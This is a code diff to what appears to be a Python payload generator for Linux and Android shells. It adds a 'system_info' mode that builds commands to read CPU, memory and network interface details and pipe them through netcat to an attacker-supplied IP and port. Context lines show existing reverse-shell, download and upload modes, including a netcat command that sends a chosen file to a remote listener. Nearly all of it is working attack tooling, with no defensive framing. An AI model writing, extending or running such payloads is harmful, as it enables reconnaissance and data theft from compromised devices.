@@ -65,6 +65,13 @@ def upload():
     elif args.m == "android":
        shellcode = "toybox nc -w 3 " + args.i + " " + args.p + " < " + args.sources + "\n" 
     write_payload(shellcode)
+def system_info():
+    shellcode = ''
+    if args.m == "linux":
+        shellcode = "(cat /proc/cpuinfo && cat /proc/meminfo && ip a) | nc -w 3 " + args.i + " " + args.p + "\n"
+    elif args.m == "android":
+       shellcode = "(cat /proc/cpuinfo && cat /proc/meminfo && ip a) | toybox nc -w 3 " + args.i + " " + args.p + "\n" 
+    write_payload(shellcode)
 
 if args.r:
     reverse_shell()
@@ -74,3 +81,5 @@ elif args.d:
     download()
 elif args.u:
     upload()
+elif args.z:
+    system_info()
